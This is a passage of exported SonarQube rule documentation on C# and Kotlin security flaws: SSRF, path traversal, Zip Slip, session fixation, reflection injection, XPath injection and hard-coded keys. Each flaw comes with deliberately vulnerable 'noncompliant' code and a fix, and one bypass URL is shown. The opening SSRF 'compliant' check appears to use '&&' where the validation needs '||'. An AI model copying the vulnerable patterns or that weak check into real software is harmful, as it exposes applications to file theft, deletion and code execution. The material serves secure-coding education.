using System.Web.Mvc;

public class ExampleController: Controller
{
    private readonly string[] allowedSchemes &#61; { &#34;https&#34; };
    private readonly string[] allowedDomains &#61; { &#34;trusted1.example.com&#34;, &#34;trusted2.example.com&#34; };

    [HttpGet]
    public IActionResult ImageFetch(string location)
    {
        Uri uri &#61; new Uri(location);

        if (!allowedDomains.Contains(uri.Host) &amp;&amp; !allowedSchemes.Contains(uri.Scheme))
        {
            return BadRequest();
        }

        HttpWebRequest request &#61; (HttpWebRequest)WebRequest.Create(uri);

        return Ok();
    }
}
</pre>
<h3>How does this work?</h3>
<p>The application should avoid opening URLs that are constructed with untrusted data.</p>
<p>When such a feature is strictly necessary, SSRF can be mitigated by applying an allow-list of trustable schemes and domains.</p>
<p>The compliant code example uses such an approach.</p>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" rel="nofollow">OWASP Top 10 2021 Category A10</a> - Server-Side Request
  Forgery (SSRF) </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/918" rel="nofollow">MITRE, CWE-918</a> - Server-Side Request Forgery (SSRF) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S2083">
              roslyn.sonaranalyzer.security.cs:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to delete arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    private static string TargetDirectory &#61; &#34;/path/to/target/directory/&#34;;

    public void Example(string filename)
    {
        string path &#61; Path.Combine(TargetDirectory, filename);
        System.IO.File.Delete(path);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    private static string TargetDirectory &#61; &#34;/path/to/target/directory/&#34;;

    public void Example(string filename)
    {
        string path &#61; Path.Combine(TargetDirectory, filename);
        string canonicalDestinationPath &#61; Path.GetFullPath(path);

        if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))
        {
            System.IO.File.Delete(canonicalDestinationPath);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths
constructed from untrusted data:</p>
<ol><li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>
  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li><li> Resolve the canonical path of the file by using methods like <code>System.IO.Path.GetFullPath</code>. This will resolve relative path or path
  components like <code>../</code> and removes any ambiguity regarding the file’s location. </li><li> Check that the canonical path is within the directory where the file should be located. </li></ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol><li> <code>data &#61; transform(user_input);</code> </li><li> <code>data &#61; normalize(data);</code> </li><li> <code>data &#61; sanitize(data);</code> </li><li> <code>use(data);</code> </li></ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v&#61;V-DdcKADnFk" rel="nofollow">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path
separator as the last character</strong>.<br /> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>TargetDirectory</code> does not end with a path
separator:</p>
<pre>
private static string TargetDirectory &#61; &#34;/Users/John&#34;;

public void Example(string filename)
{
    string canonicalDestinationPath &#61; Path.GetFullPath(filename);

    if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))
    {
        System.IO.File.Delete(canonicalDestinationPath);
    }
}
</pre>
<p>This check can be bypassed because <code>&#34;/Users/Johnny/file&#34;.startsWith(&#34;/Users/John&#34;)</code> returns <code>true</code>. Thus, for validation,
<code>&#34;/Users/John&#34;</code> should actually be <code>&#34;/Users/John/&#34;</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br /> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3" rel="nofollow">Here is a real-life example of this vulnerability.</a></p>
<h4>Do not use Path.Combine as a validator</h4>
<p>The <a href="https://learn.microsoft.com/en-us/dotnet/api/system.io.path.combine" rel="nofollow">official documentation</a> states that if any argument other than
the first is an absolute path, any previous argument is discarded.</p>
<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6287">
              roslyn.sonaranalyzer.security.cs:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a href="https://example.com?cookie&#61;injectedcookie" rel="nofollow">https://example.com?cookie&#61;injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br /> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in ASP.NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    [HttpGet]
    public IActionResult CheckCookie(string cookie)
    {
        if (Request.Cookies[&#34;ASP.NET_SessionId&#34;] &#61;&#61; null)
        {
            Response.Cookies.Append(&#34;ASP.NET_SessionId&#34;, cookie);
        }

        return View(&#34;Welcome&#34;);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.Web;
using System.Web.Mvc;

public class ExampleController : Controller
{
    [HttpGet]
    public IActionResult CheckCookie()
    {
        if (Request.Cookies[&#34;ASP.NET_SessionId&#34;] &#61;&#61; null)
        {
            return View(&#34;GetCookie&#34;);
        }

        return View(&#34;Welcome&#34;);
    }
}
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br /> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/384" rel="nofollow">MITRE, CWE-384</a> - Session Fixation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6173">
              roslyn.sonaranalyzer.security.cs:S6173
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Reflection injections occur in a web application when it retrieves data from a user or a third-party service and fully or partially uses it to
inspect, load or invoke a component by name.</p>
<p>If an application uses a reflection method in a way that is vulnerable to injections, it is exposed to attacks that aim to achieve remote code
execution on the server’s website.</p>
<p>A user with malicious intent exploits this by carefully crafting a string involving symbols such as class methods, that will help them change the
initial reflection logic to an impactful malicious one.</p>
<p>After creating the malicious request and triggering it, the attacker can attack the servers affected by this vulnerability without relying on any
pre-requisites.</p>
<h3>What is the potential impact?</h3>
<p>If user-supplied values are used to choose which code is executed, an attacker may be able to supply carefully-chosen values that cause unexpected
code to run. The attacker can use this ability to run arbitrary code on the server.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting a seemingly-legitimate object, but whose properties might be used maliciously.</p>
<p>Depending on the application, attackers might be able to modify important data structures or content to escalate privileges or perform unwanted
actions. For example, with an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object triggering code execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul><li> Download the internal server’s data, most likely to sell it. </li><li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li><li> Stop services or exhaust resources, for instance, with fork bombs. </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate their privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>In the following example, the code simulates a feature in an image editing application that allows users to install plugins to add new filters or
effects. It assumes the user will give a known name, such as &#34;SepiaEffect&#34;.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    public IActionResult Apply(string EffectName)
    {
        var EffectInstance  &#61; Activator.CreateInstance(null, EffectName); // Noncompliant
        object EffectPlugin &#61; EffectInstance.Unwrap();

        if ( ((IEffect)EffectPlugin).ApplyFilter() )
        {
            return Ok();
        }
        else
        {
            return Problem();
        }
    }
}

public interface IEffect
{
    bool ApplyFilter();
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    private static readonly string[] EFFECT_ALLOW_LIST &#61; {
        &#34;SepiaEffect&#34;,
        &#34;BlackAndWhiteEffect&#34;,
        &#34;WaterColorEffect&#34;,
        &#34;OilPaintingEffect&#34;
    };

    public IActionResult Apply(string EffectName)
    {
        if (!EFFECT_ALLOW_LIST.Contains(EffectName))
        {
            return BadRequest(&#34;Invalid effect name. The effect is not allowed.&#34;);
        }

        var EffectInstance  &#61; Activator.CreateInstance(null, EffectName);
        object EffectPlugin &#61; EffectInstance.Unwrap();

        if ( ((IEffect)EffectPlugin).ApplyFilter() )
        {
            return Ok();
        }
        else
        {
            return Problem();
        }
    }
}

public interface IEffect
{
    bool ApplyFilter();
}
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>The cleanest way to avoid this defect is to validate the input before using it in a reflection method.</p>
<p>Create a list of authorized and secure classes that you want the application to be able to execute.<br /> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS, Top 25 Software Errors</a> - Insecure Interaction Between Components </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/470" rel="nofollow">MITRE, CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code (&#39;Unsafe
  Reflection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S6096">
              roslyn.sonaranalyzer.security.cs:S6096
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access
this file without validating its path first.</p>
<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial
intended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override arbitrary files</h4>
<p>The application opens the archive to copy its entries to the file system. The entries&#39; names contain path traversal payloads for existing files in
the system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or
operating system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file
without being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    private static string TargetDirectory &#61; &#34;/example/directory/&#34;;

    public void ExtractEntry(IEnumerator&lt;ZipArchiveEntry&gt; entriesEnumerator)
    {
        ZipArchiveEntry entry &#61; entriesEnumerator.Current;
        string destinationPath &#61; Path.Combine(TargetDirectory, entry.FullName);

        entry.ExtractToFile(destinationPath);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    private static string TargetDirectory &#61; &#34;/example/directory/&#34;;

    public void ExtractEntry(IEnumerator&lt;ZipArchiveEntry&gt; entriesEnumerator)
    {
        ZipArchiveEntry entry &#61; entriesEnumerator.Current;
        string destinationPath &#61; Path.Combine(TargetDirectory, entry.FullName);
        string canonicalDestinationPath &#61; Path.GetFullPath(destinationPath);

        if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))
        {
            entry.ExtractToFile(canonicalDestinationPath);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>
<p>The validation should be done as follow:</p>
<ol><li> Resolve the canonical path of the file by using methods like <code>System.IO.Path.GetFullPath</code> or
  <code>System.IO.Path.GetFileName</code>. This will resolve relative path or path components like <code>../</code> and removes any ambiguity
  regarding the file’s location. </li><li> Check that the canonical path is within the directory where the file should be located. </li><li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>
  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li></ol>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path
separator as the last character</strong>.<br /> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>TargetDirectory</code> does not end with a path
separator:</p>
<pre>
static private String TargetDirectory &#61; &#34;/Users/John&#34;;

public void ExtractEntry(IEnumerator&lt;ZipArchiveEntry&gt; entriesEnumerator)
{
    ZipArchiveEntry entry &#61; entriesEnumerator.Current;
    string canonicalDestinationPath &#61; Path.GetFullPath(TargetDirectory);

    if (canonicalDestinationPath.StartsWith(TargetDirectory, StringComparison.Ordinal))
    {
        entry.ExtractToFile(canonicalDestinationPath);
    }
}
</pre>
<p>This check can be bypassed because <code>&#34;/Users/Johnny&#34;.startsWith(&#34;/Users/John&#34;)</code> returns <code>true</code>. Thus, for validation,
<code>&#34;/Users/John&#34;</code> should actually be <code>&#34;/Users/John/&#34;</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br /> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3" rel="nofollow">Here is a real-life example of this vulnerability.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://snyk.io/research/zip-slip-vulnerability" rel="nofollow">snyk</a> - Zip Slip Vulnerability </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S2091">
              roslyn.sonaranalyzer.security.cs:S2091
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without
sanitizing it first.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to XPath injection:<br /> After discovering the injection point, attackers insert data into the
vulnerable field to execute malicious commands in the affected XML documents.</p>
<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br /> In cases where organizations rely on XML
structures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to
harmless.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data Leaks</h4>
<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility
still exists with configuration files, for example.</p>
<h4>Data deletion and denial of service</h4>
<p>The malicious query allows the attacker to delete data in the affected XML documents.<br /> This threat is particularly insidious if the attacked
organization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the
regular operations of an organization.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to XPath injections because untrusted data is concatenated in an XPath query without prior validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    [HttpGet]
    public IActionResult Authenticate(string user, string pass)
    {
        XmlDocument doc &#61; new XmlDocument();

        String expression &#61; &#34;/users/user[&#64;name&#61;&#39;&#34; &#43; user &#43; &#34;&#39; and &#64;pass&#61;&#39;&#34; &#43; pass &#43; &#34;&#39;]&#34;;

        return Json(doc.SelectSingleNode(expression) !&#61; null);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    [HttpGet]
    public IActionResult Authenticate(string user, string pass)
    {
        XmlDocument doc &#61; new XmlDocument();
        if (!Regex.IsMatch(user, &#34;^[a-zA-Z]&#43;$&#34;) || !Regex.IsMatch(pass, &#34;^[a-zA-Z]&#43;$&#34;))
        {
            return BadRequest();
        }

        String expression &#61; &#34;/users/user[&#64;name&#61;&#39;&#34; &#43; user &#43; &#34;&#39; and &#64;pass&#61;&#39;&#34; &#43; pass &#43; &#34;&#39;]&#34;;

        return Json(doc.SelectSingleNode(expression) !&#61; null);
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<h4>Validation</h4>
<p>In case XPath parameterized queries are not available, the most secure way to protect against injections is to validate the input before using it
in an XPath query.</p>
<p><strong>Important</strong>: The application must do this validation server-side. Validating this client-side is insecure.</p>
<p>Input can be validated in multiple ways:</p>
<ul><li> By checking against a list of authorized and secure strings that the application is allowed to use in a query. </li><li> By ensuring user input is restricted to a specific range of characters (e.g., the regex <code>/^[a-zA-Z0-9]*$/</code> only allows alphanumeric
  characters.) </li><li> By ensuring user input does not include any XPath metacharacters, such as <code>&#34;</code>, <code>&#39;</code>, <code>/</code>, <code>&#64;</code>,
  <code>&#61;</code>, <code>*</code>, <code>[</code>, <code>]</code>, <code>(</code> and <code>)</code>. </li></ul>
<p>If user input is not considered valid, it should be rejected as it is unsafe.</p>
<p>In the example, a validation mechanism is applied to untrusted input to ensure it is strictly composed of alphabetic characters.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection" rel="nofollow">OWASP, XPath Injection
  Prevention Cheat Sheet</a> </li><li> <a href="https://www.ambionics.io/blog/hacking-watchguard-firewalls#vulnerability-2-time-based-xpath-injection" rel="nofollow">Ambionics, XPath Injection
  Section of &#34;Hacking WatchGuard Firewalls&#39;</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/643" rel="nofollow">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6301">
              kotlin:S6301
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Storing data locally is a common task for mobile applications. There are many convenient solutions that allow storing data persistently, for
example SQLiteDatabase and Realm. These systems can be initialized with a secret key in order to store the data encrypted.</p>
<p>The encryption key is meant to stay secret and should not be hard-coded in the application as it would mean that:</p>
<ul><li> All user would use the same encryption key. </li><li> The encryption key would be known by anyone who as access to the source code or the application binary code. </li><li> Data stored encrypted in the database would not be protected. </li></ul>
<p>There are different approaches how the key can be provided to encrypt and decrypt the database. One of the most convinient way to is to rely on
<code>EncryptedSharedPreferences</code> to store encryption keys. It can also be provided dynamically by the user of the application or fetched from a
remote server.</p>
<h3>Noncompliant code example</h3>
<p><a href="https://www.zetetic.net/sqlcipher/sqlcipher-for-android/" rel="nofollow">SQLCipher</a></p>
<pre>
val key &#61; &#34;gb09ym9ydoolp3w886d0tciczj6ve9kszqd65u7d126040gwy86xqimjpuuc788g&#34;
val db &#61; SQLiteDatabase.openOrCreateDatabase(&#34;test.db&#34;, key, null) // Noncompliant
</pre>
<p><a href="https://github.com/realm/realm-kotlin/" rel="nofollow">Realm</a></p>
<pre>
val key &#61; &#34;gb09ym9ydoolp3w886d0tciczj6ve9kszqd65u7d126040gwy86xqimjpuuc788g&#34;
val config &#61; RealmConfiguration.Builder()
    .encryptionKey(key.toByteArray()) // Noncompliant
    .build()
val realm &#61; Realm.getInstance(config)
</pre>
<h3>Compliant solution</h3>
<p><a href="https://www.zetetic.net/sqlcipher/sqlcipher-for-android/" rel="nofollow">SQLCipher</a></p>
<pre>
val db &#61; SQLiteDatabase.openOrCreateDatabase(&#34;test.db&#34;, getKey(), null)
</pre>
<p><a href="https://github.com/realm/realm-kotlin/" rel="nofollow">Realm</a></p>
<pre>
val config &#61; RealmConfiguration.Builder()
    .encryptionKey(getKey())
    .build()
val realm &#61; Realm.getInstance(config)
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Data Storage and Privacy Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage" rel="nofollow">OWASP Mobile Top 10 2016 Category M2</a> - Insecure
  Data Storage </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://cwe.mitre.org/data/definitions/321" rel="nofollow">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kotlin:S6300">
              kotlin:S6300
            </a>
          </td>
          <td>
            <details>
              <p>Storing files locally is a common task for mobile applications. Files that are stored unencrypted can be read out and modified by an attacker with
physical access to the device. Access to sensitive data can be harmful for the user of the application, for example when the device gets stolen.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The file contains sensitive data that could cause harm when leaked. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
